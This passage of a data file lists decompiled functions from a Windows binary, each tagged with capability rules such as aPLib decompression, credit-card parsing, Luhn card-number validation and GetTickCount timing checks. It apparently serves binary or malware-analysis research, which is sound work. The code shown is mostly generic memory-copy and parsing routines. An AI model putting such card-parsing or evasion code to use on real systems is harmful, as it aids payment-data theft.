iVar9;\n                uVar20 = *puVar8;\n                uVar13 = puVar8[1];\n                uVar14 = puVar8[2];\n                uVar15 = puVar8[3];\n            }\n            if ((uVar11 & 0xf) != 0) {\n                uVar17 = *(arg2 + 4);\n                uVar18 = *(arg2 + 1);\n                uVar19 = *(arg2 + 0xc);\n                *arg1 = *arg2;\n                *(arg1 + 4) = uVar17;\n                *(arg1 + 1) = uVar18;\n                *(arg1 + 0xc) = uVar19;\n            }\n            *puVar7 = uVar20;\n            puVar7[1] = uVar13;\n            puVar7[2] = uVar14;\n            puVar7[3] = uVar15;\n            return arg1;\n        }\n        if (arg3 < 0x81) {\n            puVar8 = arg1 + iVar9;\n            uVar17 = *puVar8;\n            uVar18 = puVar8[1];\n            uVar19 = puVar8[2];\n            uVar20 = puVar8[3];\n            puVar5 = arg1 + 2;\n            puVar10 = arg3 - 0x10;\n        }\n        else {\n            if ((*0x180129104 & 2) != 0) {\n                puVar5 = arg1;\n                for (; arg3 != 0; arg3 = arg3 - 1) {\n                    *puVar5 = *arg2;\n                    arg2 = arg2 + 1;\n                    puVar5 = puVar5 + 1;\n                }\n                return arg1;\n            }\n            puVar8 = arg1 + iVar9;\n            uVar13 = puVar8[1];\n            uVar14 = puVar8[2];\n            uVar15 = puVar8[3];\n            puVar4 = arg1 + 2;\n            uVar17 = *puVar8;\n            uVar18 = uVar13;\n            uVar19 = uVar14;\n            uVar20 = uVar15;\n            if ((arg1 & 0xf) != 0) {\n                puVar7 = (puVar4 & 0xfffffffffffffff0) + iVar9;\n                uVar17 = *puVar7;\n                uVar18 = puVar7[1];\n                uVar19 = puVar7[2];\n                uVar20 = puVar7[3];\n                puVar4 = (puVar4 & 0xfffffffffffffff0) + 0x10;\n                *arg1 = *puVar8;\n                *(arg1 + 4) = uVar13;\n                *(arg1 + 1) = uVar14;\n                *(arg1 + 0xc) = uVar15;\n            }\n            puVar10 = arg1 + (arg3 - puVar4);\n            uVar11 = puVar10 >> 7;\n            puVar5 = puVar4;\n            if (uVar11 != 0) {\n                *(puVar4 + -2) = uVar17;\n                *(puVar4 + -0xc) = uVar18;\n                *(puVar4 + -1) = uVar19;\n                *(puVar4 + -4) = uVar20;\n                if (*0x180123098 < uVar11) {\n                    while( true ) {\n                        puVar8 = puVar4 + iVar9;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x10;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        puVar5 = puVar4 + 0x10;\n                        *puVar4 = *puVar8;\n                        *(puVar4 + 4) = uVar17;\n                        *(puVar4 + 1) = uVar18;\n                        *(puVar4 + 0xc) = uVar19;\n                        *(puVar4 + 2) = uVar20;\n                        *(puVar4 + 0x14) = uVar13;\n                        *(puVar4 + 3) = uVar14;\n                        *(puVar4 + 0x1c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x20;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x30;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        uVar11 = uVar11 - 1;\n                        *(puVar4 + 4) = *puVar8;\n                        *(puVar4 + 0x24) = uVar17;\n                        *(puVar4 + 5) = uVar18;\n                        *(puVar4 + 0x2c) = uVar19;\n                        *(puVar4 + 6) = uVar20;\n                        *(puVar4 + 0x34) = uVar13;\n                        *(puVar4 + 7) = uVar14;\n                        *(puVar4 + 0x3c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x40;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x50;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        *(puVar4 + 8) = *puVar8;\n                        *(puVar4 + 0x44) = uVar17;\n                        *(puVar4 + 9) = uVar18;\n                        *(puVar4 + 0x4c) = uVar19;\n                        *(puVar4 + 10) = uVar20;\n                        *(puVar4 + 0x54) = uVar13;\n                        *(puVar4 + 0xb) = uVar14;\n                        *(puVar4 + 0x5c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x60;\n                        uVar13 = *puVar8;\n                        uVar14 = puVar8[1];\n                        uVar15 = puVar8[2];\n                        uVar16 = puVar8[3];\n                        puVar8 = puVar4 + iVar9 + 0x70;\n                        uVar17 = *puVar8;\n                        uVar18 = puVar8[1];\n                        uVar19 = puVar8[2];\n                        uVar20 = puVar8[3];\n                        if (uVar11 == 0) break;\n                        *(puVar4 + 0xc) = uVar13;\n                        *(puVar4 + 100) = uVar14;\n                        *(puVar4 + 0xd) = uVar15;\n                        *(puVar4 + 0x6c) = uVar16;\n                        *(puVar4 + 0xe) = uVar17;\n                        *(puVar4 + 0x74) = uVar18;\n                        *(puVar4 + 0xf) = uVar19;\n                        *(puVar4 + 0x7c) = uVar20;\n                        puVar4 = puVar5;\n                    }\n                }\n                else {\n                    while( true ) {\n                        puVar8 = puVar4 + iVar9;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x10;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        puVar5 = puVar4 + 0x10;\n                        *puVar4 = *puVar8;\n                        *(puVar4 + 4) = uVar17;\n                        *(puVar4 + 1) = uVar18;\n                        *(puVar4 + 0xc) = uVar19;\n                        *(puVar4 + 2) = uVar20;\n                        *(puVar4 + 0x14) = uVar13;\n                        *(puVar4 + 3) = uVar14;\n                        *(puVar4 + 0x1c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x20;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x30;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        uVar11 = uVar11 - 1;\n                        *(puVar4 + 4) = *puVar8;\n                        *(puVar4 + 0x24) = uVar17;\n                        *(puVar4 + 5) = uVar18;\n                        *(puVar4 + 0x2c) = uVar19;\n                        *(puVar4 + 6) = uVar20;\n                        *(puVar4 + 0x34) = uVar13;\n                        *(puVar4 + 7) = uVar14;\n                        *(puVar4 + 0x3c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x40;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x50;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        *(puVar4 + 8) = *puVar8;\n                        *(puVar4 + 0x44) = uVar17;\n                        *(puVar4 + 9) = uVar18;\n                        *(puVar4 + 0x4c) = uVar19;\n                        *(puVar4 + 10) = uVar20;\n                        *(puVar4 + 0x54) = uVar13;\n                        *(puVar4 + 0xb) = uVar14;\n                        *(puVar4 + 0x5c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x60;\n                        uVar13 = *puVar8;\n                        uVar14 = puVar8[1];\n                        uVar15 = puVar8[2];\n                        uVar16 = puVar8[3];\n                        puVar8 = puVar4 + iVar9 + 0x70;\n                        uVar17 = *puVar8;\n                        uVar18 = puVar8[1];\n                        uVar19 = puVar8[2];\n                        uVar20 = puVar8[3];\n                        if (uVar11 == 0) break;\n                        *(puVar4 + 0xc) = uVar13;\n                        *(puVar4 + 100) = uVar14;\n                        *(puVar4 + 0xd) = uVar15;\n                        *(puVar4 + 0x6c) = uVar16;\n                        *(puVar4 + 0xe) = uVar17;\n                        *(puVar4 + 0x74) = uVar18;\n                        *(puVar4 + 0xf) = uVar19;\n                        *(puVar4 + 0x7c) = uVar20;\n                        puVar4 = puVar5;\n                    }\n                }\n                *(puVar5 + -4) = uVar13;\n                *(puVar5 + -0x1c) = uVar14;\n                *(puVar5 + -3) = uVar15;\n                *(puVar5 + -0x14) = uVar16;\n                puVar10 = puVar10 & 0x7f;\n            }\n        }\n        for (uVar11 = puVar10 >> 4; uVar11 != 0; uVar11 = uVar11 - 1) {\n            *(puVar5 + -2) = uVar17;\n            *(puVar5 + -0xc) = uVar18;\n            *(puVar5 + -1) = uVar19;\n            *(puVar5 + -4) = uVar20;\n            puVar8 = puVar5 + iVar9;\n            uVar17 = *puVar8;\n            uVar18 = puVar8[1];\n            uVar19 = puVar8[2];\n            uVar20 = puVar8[3];\n            puVar5 = puVar5 + 2;\n        }\n        uVar11 = puVar10 & 0xf;\n        if (uVar11 != 0) {\n            puVar8 = puVar5 + iVar9 + (uVar11 - 0x10);\n            uVar13 = puVar8[1];\n            uVar14 = puVar8[2];\n            uVar15 = puVar8[3];\n            *(puVar5 + (uVar11 - 0x10)) = *puVar8;\n            *(puVar5 + (uVar11 - 0xc)) = uVar13;\n            *(puVar5 + (uVar11 - 8)) = uVar14;\n            *(puVar5 + (uVar11 - 4)) = uVar15;\n        }\n        *(puVar5 + -2) = uVar17;\n        *(puVar5 + -0xc) = uVar18;\n        *(puVar5 + -1) = uVar19;\n        *(puVar5 + -4) = uVar20;\n        return arg1;\n    }\n    uVar17 = *(arg2 + 4);\n    uVar18 = *(arg2 + 1);\n    uVar19 = *(arg2 + 0xc);\n    puVar8 = arg2 + (arg3 - 0x10);\n    uVar20 = *puVar8;\n    uVar13 = puVar8[1];\n    uVar14 = puVar8[2];\n    uVar15 = puVar8[3];\n    *arg1 = *arg2;\n    *(arg1 + 4) = uVar17;\n    *(arg1 + 1) = uVar18;\n    *(arg1 + 0xc) = uVar19;\n    puVar8 = arg1 + (arg3 - 0x10);\n    *puVar8 = uVar20;\n    puVar8[1] = uVar13;\n    puVar8[2] = uVar14;\n    puVar8[3] = uVar15;\n    return arg1;\n}\n",
        "token_count": 6048
    },
    "1800ae29": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.1800ae290(uchar (*arg1) [16], ulong noname_1, uint64_t arg3)\n\n{\n    uchar (*pauVar1) [16];\n    uchar (*pauVar2) [16];\n    uint16_t uVar3;\n    uint64_t uVar5;\n    uchar auVar6 [12];\n    uint32_t uVar4;\n    uchar auVar7 [13];\n    uchar auVar8 [16];\n    uchar uVar9;\n    \n    uVar5 = noname_1 * 0x101010101010101;\n    uVar3 = uVar5;\n    uVar4 = uVar5;\n    if (arg3 < 0x11) {\n        uVar9 = uVar5;\n    // switch table (17 cases) at 0x180136050\n        switch(*(arg3 * 4 + 0x180136050) + 0x180000000) {\n        case 0x1800ae3c0:\n            *(arg1[-1] + arg3 + 1) = uVar5;\n        case 0x1800ae3c4:\n            *(arg1[-1] + arg3 + 9) = uVar4;\n        case 0x1800ae3c7:\n            *(arg1[-1] + arg3 + 0xd) = uVar3;\n        case 0x1800ae3cb:\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x1800ae3ce:\n            return arg1;\n        case 0x1800ae3d0:\n            *(arg1[-1] + arg3 + 4) = uVar5;\n        case 0x1800ae3d4:\n            *(arg1[-1] + arg3 + 0xc) = uVar4;\n            return arg1;\n        case 0x1800ae3d8:\n            *(arg1[-1] + arg3 + 7) = uVar5;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x1800ae3e0:\n            *(arg1[-1] + arg3 + 3) = uVar5;\n        case 0x1800ae3e4:\n            *(arg1[-1] + arg3 + 0xb) = uVar4;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x1800ae3f0:\n            *(arg1[-1] + arg3 + 2) = uVar5;\n        case 0x1800ae3f4:\n            *(arg1[-1] + arg3 + 10) = uVar4;\n        case 0x1800ae3f7:\n            *(arg1[-1] + arg3 + 0xe) = uVar3;\n            return arg1;\n        case 0x1800ae3fc:\n            **arg1 = uVar5;\n            return arg1;\n        case 0x1800ae400:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            (*arg1)[10] = uVar9;\n            return arg1;\n        case 0x1800ae410:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            return arg1;\n        case 0x1800ae418:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar5;\n            return arg1;\n        }\n    }\n    uVar9 = SUB141(ZEXT814(uVar5) >> 0x30, 0);\n    auVar7 = ZEXT813(uVar5);\n    auVar6 = ZEXT812(uVar5);\n    auVar8 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(SUB1610(CONCAT97(SUB169(\n                                                            CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(SUB166(CONCAT511(\n                                                            SUB165(CONCAT412(SUB164(CONCAT313(SUB163(CONCAT214(SUB162(\n                                                            CONCAT115(SUB161(ZEXT816(uVar5) >> 0x38, 0), \n                                                                      CONCAT114(SUB151(ZEXT815(uVar5) >> 0x38, 0), \n                                                                                ZEXT814(uVar5))) >> 0x70, 0), \n                                                            CONCAT113(uVar9, auVar7)) >> 0x68, 0), \n                                                            CONCAT112(uVar9, auVar6)) >> 0x60, 0), \n                                                            CONCAT111(SUB131(auVar7 >> 0x28, 0), ZEXT811(uVar5))) >>\n                                                            0x58, 0), CONCAT110(SUB121(auVar6 >> 0x28, 0), uVar5)) >>\n                                                            0x50, 0), CONCAT19(SUB131(auVar7 >> 0x20, 0), uVar5)) >>\n                                                            0x48, 0), CONCAT18(SUB121(auVar6 >> 0x20, 0), uVar5)) >>\n                                                            0x40, 0), (uVar5 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (uVar5 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (uVar5 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (uVar5 >> 0x10) << 0x20) >> 0x20, 0), (uVar4 >> 8) << 0x18)\n                                                 >> 0x18, 0), (uVar5 >> 8) << 0x10) >> 0x10, 0), \n                       uVar3 & 0xff | uVar3 << 8);\n    pauVar1 = arg1;\n    if (0x80 < arg3) {\n        if ((*0x180129104 & 2) != 0) {\n            for (; arg3 != 0; arg3 = arg3 - 1) {\n                (*pauVar1)[0] = noname_1;\n                pauVar1 = *pauVar1 + 1;\n            }\n            return arg1;\n        }\n        *arg1 = auVar8;\n        pauVar1 = arg1[1] & 0xfffffffffffffff0;\n        arg3 = arg1 + (arg3 - pauVar1);\n        uVar5 = arg3 >> 7;\n        if (uVar5 != 0) {\n            if (*0x1801230a0 < uVar5) {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n            else {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n        }\n    }\n    for (uVar5 = arg3 >> 4; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *pauVar1 = auVar8;\n        pauVar1 = pauVar1[1];\n    }\n    if ((arg3 & 0xf) != 0) {\n        *(pauVar1[-1] + (arg3 & 0xf)) = auVar8;\n    }\n    return arg1;\n}\n",
        "token_count": 1956
    },
    "18007c73": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\nuint * fcn.18007c73c(ulong arg1, uint *arg2, uint *arg3, uint *arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    char cVar4;\n    ushort uVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    uint *puVar8;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    char *in_stack_00000040;\n    uint uStack88;\n    uint uStack84;\n    int64_t iStack80;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    \n    iVar7 = *(*(in_stack_00000028 + 0x40) + 8);\n    iStack80 = iVar7;\n    (**0x1800de8f0)(iVar7);\n    piVar6 = fcn.180076930(&uStack88);\n    if ((iVar7 != 0) && (iVar7 = (**0x1800de8f0)(),  iVar7 != 0)) {\n        (**0x1800de8f0)(iVar7, 1);\n    }\n    cVar4 = *in_stack_00000040;\n    do {\n        if (cVar4 == '\\0') {\ncode_r0x00018007c8e0:\n            cVar4 = fcn.1800890e8(arg3, arg4);\n            if (cVar4 != '\\0') {\n                *in_stack_00000030 = *in_stack_00000030 | 1;\n            }\n            uVar1 = arg3[1];\n            uVar2 = arg3[2];\n            uVar3 = arg3[3];\n            *arg2 = *arg3;\n            arg2[1] = uVar1;\n            arg2[2] = uVar2;\n            arg2[3] = uVar3;\n            return arg2;\n        }\n        if (cVar4 == '%') {\n            in_stack_00000040 = in_stack_00000040 + 1;\n            uStack88 = *arg4;\n            uStack84 = arg4[1];\n            iStack80 = *(arg4 + 2);\n            uStack72 = *arg3;\n            uStack68 = arg3[1];\n            uStack64 = arg3[2];\n            uStack60 = arg3[3];\n            puVar8 = (**0x1800de8f0)();\n            uVar1 = puVar8[1];\n            uVar2 = puVar8[2];\n            uVar3 = puVar8[3];\n            *arg3 = *puVar8;\n            arg3[1] = uVar1;\n            arg3[2] = uVar2;\n            arg3[3] = uVar3;\n        }\n        else if (cVar4 == ' ') {\n            while (cVar4 = fcn.1800890e8(arg3, arg4),  cVar4 == '\\0') {\n                uVar5 = fcn.1800783e4(arg3);\n                cVar4 = (**0x1800de8f0)(piVar6, 0x48, uVar5, *(*piVar6 + 0x20));\n                if (cVar4 == '\\0') break;\n                fcn.18007f190(arg3);\n            }\n        }\n        else {\n            uVar5 = fcn.1800783e4(arg3);\n            cVar4 = (**0x1800de8f0)(piVar6, uVar5, 0, *(*piVar6 + 0x70));\n            if (cVar4 != *in_stack_00000040) {\n                *in_stack_00000030 = *in_stack_00000030 | 2;\n                goto code_r0x00018007c8e0;\n            }\n            fcn.18007f190(arg3);\n        }\n        in_stack_00000040 = in_stack_00000040 + 1;\n        cVar4 = *in_stack_00000040;\n    } while( true );\n}\n",
        "token_count": 916
    },
    "18007c92": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\nuint * fcn.18007c920(ulong arg1, uint *arg2, uint *arg3, uint *arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    char cVar4;\n    ushort uVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    uint *puVar8;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    char *in_stack_00000040;\n    uint uStack88;\n    uint uStack84;\n    int64_t iStack80;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    \n    iVar7 = *(*(in_stack_00000028 + 0x40) + 8);\n    iStack80 = iVar7;\n    (**0x1800de8f0)(iVar7);\n    piVar6 = fcn.180014560(&uStack88);\n    if ((iVar7 != 0) && (iVar7 = (**0x1800de8f0)(),  iVar7 != 0)) {\n        (**0x1800de8f0)(iVar7, 1);\n    }\n    cVar4 = *in_stack_00000040;\n    do {\n        if (cVar4 == '\\0') {\ncode_r0x00018007cac4:\n            cVar4 = fcn.1800890e8(arg3, arg4);\n            if (cVar4 != '\\0') {\n                *in_stack_00000030 = *in_stack_00000030 | 1;\n            }\n            uVar1 = arg3[1];\n            uVar2 = arg3[2];\n            uVar3 = arg3[3];\n            *arg2 = *arg3;\n            arg2[1] = uVar1;\n            arg2[2] = uVar2;\n            arg2[3] = uVar3;\n            return arg2;\n        }\n        if (cVar4 == '%') {\n            in_stack_00000040 = in_stack_00000040 + 1;\n            uStack88 = *arg4;\n            uStack84 = arg4[1];\n            iStack80 = *(arg4 + 2);\n            uStack72 = *arg3;\n            uStack68 = arg3[1];\n            uStack64 = arg3[2];\n            uStack60 = arg3[3];\n            puVar8 = (**0x1800de8f0)();\n            uVar1 = puVar8[1];\n            uVar2 = puVar8[2];\n            uVar3 = puVar8[3];\n            *arg3 = *puVar8;\n            arg3[1] = uVar1;\n            arg3[2] = uVar2;\n            arg3[3] = uVar3;\n        }\n        else if (cVar4 == ' ') {\n            while (cVar4 = fcn.1800890e8(arg3, arg4),  cVar4 == '\\0') {\n                uVar5 = fcn.1800783e4(arg3);\n                cVar4 = (**0x1800de8f0)(piVar6, 0x48, uVar5, *(*piVar6 + 0x20));\n                if (cVar4 == '\\0') break;\n                fcn.18007f190(arg3);\n            }\n        }\n        else {\n            uVar5 = fcn.1800783e4(arg3);\n            cVar4 = (**0x1800de8f0)(piVar6, uVar5, 0, *(*piVar6 + 0x70));\n            if (cVar4 != *in_stack_00000040) {\n                *in_stack_00000030 = *in_stack_00000030 | 2;\n                goto code_r0x00018007cac4;\n            }\n            fcn.18007f190(arg3);\n        }\n        in_stack_00000040 = in_stack_00000040 + 1;\n        cVar4 = *in_stack_00000040;\n    } while( true );\n}\n",
        "token_count": 911
    },
    "180001f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.180001f40(uint *arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    iVar2 = fcn.18006dafc(0x18012a1b0, 0x180014d50, 0x18012a178);\n    if (iVar2 != 0) {\n        *arg1 = 1;\n        *(arg1 + 2) = 0x18012a178;\n        return arg1;\n    }\n    fcn.1800b1ebc();\n    pcVar1 = swi(3);\n    puVar3 = (*pcVar1)();\n    return puVar3;\n}\n",
        "token_count": 155
    },
    "18006dab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18006dab0(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *arg1;\n    if (iVar1 == 0) {\n    // WARNING: Could not recover jumptable at 0x0001800badf3. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x1800de500)(0x180129530);\n        return;\n    }\n    if (iVar1 < 8) {\n        fcn.180074eb8(iVar1 * 0x28 + 0x180128530);\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "1800024d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800024d0(int64_t arg1)\n\n{\n    ulong *puVar1;\n    \n    if (*(arg1 + 8) != NULL) {\n        puVar1 = (**(**(arg1 + 8) + 0x10))();\n        if (puVar1 != NULL) {\n    // WARNING: Could not recover jumptable at 0x0001800024f7. Too many branches\n    // WARNING: Treating indirect jump as call\n            (***puVar1)(puVar1, 1);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "1800037a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800037a0(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    ulong arg3;\n    char *arg2_00;\n    char in_R8B;\n    uchar auStack72 [16];\n    uchar auStack56 [48];\n    \n    *(arg1 + 0x10) = arg2 & 0x17;\n    uVar2 = *(arg1 + 0x14) & arg2 & 0x17;\n    if (uVar2 == 0) {\n        return;\n    }\n    if (in_R8B != '\\0') {\n        fcn.1800add8c(0, 0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if ((uVar2 & 4) == 0) {\n        arg2_00 = \"ios_base::failbit set\";\n        if ((uVar2 & 2) == 0) {\n            arg2_00 = \"ios_base::eofbit set\";\n        }\n    }\n    else {\n        arg2_00 = \"ios_base::badbit set\";\n    }\n    arg3 = fcn.180001f40(auStack72);\n    fcn.1800036d0(auStack56, arg2_00, arg3);\n    fcn.1800add8c(auStack56, 0x18011f828);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 340
    },
    "18000473": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.180004730(void)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    uint64_t uVar7;\n    int64_t arg1;\n    int64_t iVar8;\n    uint64_t uVar9;\n    \n    uVar6 = 0x1801253f8;\n    if (7 < *0x180125410) {\n        uVar6 = *0x1801253f8;\n    }\n    fcn.180010d70(0x180125578, uVar6, *0x180125408);\n    uVar6 = 0x1801254b8;\n    if (0xf < *0x1801254d0) {\n        uVar6 = *0x1801254b8;\n    }\n    fcn.180011120(0x1801255d8, uVar6, *0x1801254c8);\n    uVar6 = 0x180125418;\n    if (7 < *0x180125430) {\n        uVar6 = *0x180125418;\n    }\n    fcn.180010d70(0x180125598, uVar6, *0x180125428);\n    uVar4 = *0x1801255d0;\n    uVar3 = *0x1801254a8;\n    uVar6 = 0x180125498;\n    if (7 < *0x1801254b0) {\n        uVar6 = *0x180125498;\n    }\n    if (*0x1801255d0 < *0x1801254a8) {\n        if (0x7ffffffffffffffe < *0x1801254a8) {\n            fcn.180014b60();\n            pcVar2 = swi(3);\n            uVar6 = (*pcVar2)();\n            return uVar6;\n        }\n        uVar7 = *0x1801254a8 | 7;\n        uVar9 = 0x7ffffffffffffffe;\n        if (((uVar7 < 0x7fffffffffffffff) && (*0x1801255d0 <= 0x7ffffffffffffffe - (*0x1801255d0 >> 1))) &&\n           (uVar1 = (*0x1801255d0 >> 1) + *0x1801255d0,  uVar9 = uVar7,  uVar7 < uVar1)) {\n            uVar9 = uVar1;\n        }\n        iVar8 = uVar9 + 1;\n        if (uVar9 == 0xffffffffffffffff) {\n            iVar8 = -1;\n        }\n        iVar5 = fcn.180011cf0(0x1801255b8, iVar8);\n        iVar8 = uVar3 * 2;\n        *0x1801255c8 = uVar3;\n        *0x1801255d0 = uVar9;\n        fcn.1800ade80(iVar5, uVar6, iVar8);\n        *(iVar8 + iVar5) = 0;\n        if (7 < uVar4) {\n            iVar8 = uVar4 * 2;\n            arg1 = *0x1801255b8;\n            if (0xfff < iVar8 + 2U) {\n                arg1 = *(*0x1801255b8 + -8);\n                if (0x1f < (*0x1801255b8 - arg1) - 8U) {\n                    fcn.1800b3528(*0x1801255b8 - arg1, iVar8 + 0x29);\n                    pcVar2 = swi(3);\n                    uVar6 = (*pcVar2)();\n                    return uVar6;\n                }\n            }\n            fcn.18008fb24(arg1);\n        }\n    }\n    else {\n        iVar8 = 0x1801255b8;\n        if (7 < *0x1801255d0) {\n            iVar8 = *0x1801255b8;\n        }\n        iVar5 = *0x1801254a8 * 2;\n        *0x1801255c8 = *0x1801254a8;\n        fcn.1800ade80(iVar8, uVar6, iVar5);\n        *(iVar5 + iVar8) = 0;\n        iVar5 = *0x1801255b8;\n    }\n    *0x1801255b8 = iVar5;\n    return 0x1801255b8;\n}\n",
        "token_count": 1017
    },
    "180004d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180004d80(ulong noname_0, ulong arg2, ulong *arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uchar *arg1;\n    int64_t arg1_00;\n    int64_t *arg1_01;\n    int64_t **arg3_00;\n    ulong *arg3_01;\n    int64_t **in_stack_00000030;\n    uchar auStack440 [40];\n    uchar *puStack400;\n    uchar uStack392;\n    unkbyte7 Stack391;\n    ulong uStack376;\n    uint64_t uStack368;\n    ulong uStack360;\n    uchar *puStack352;\n    uchar auStack344 [32];\n    uchar auStack312 [128];\n    uchar auStack184 [136];\n    uint64_t uStack48;\n    \n    uStack360 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack440;\n    puStack352 = auStack344;\n    uVar4 = fcn.1800687b0(auStack312);\n    arg3_00 = in_stack_00000030;\n    if (0x7 < in_stack_00000030[3]) {\n        arg3_00 = *in_stack_00000030;\n    }\n    fcn.180068c50(uVar4, auStack344, arg3_00, arg3_00 + in_stack_00000030[2] * 2);\n    fcn.1800686c0(auStack312);\n    uVar4 = fcn.1800687b0(auStack184);\n    arg3_01 = arg3;\n    if (7 < arg3[3]) {\n        arg3_01 = *arg3;\n    }\n    fcn.180068c50(uVar4, &uStack392, arg3_01, arg3_01 + arg3[2] * 2);\n    arg1 = auStack184;\n    fcn.1800686c0(arg1);\n    puStack400 = auStack344;\n    fcn.180004b90(arg1, arg2, &uStack392, arg4);\n    if (0xf < uStack368) {\n        iVar3 = 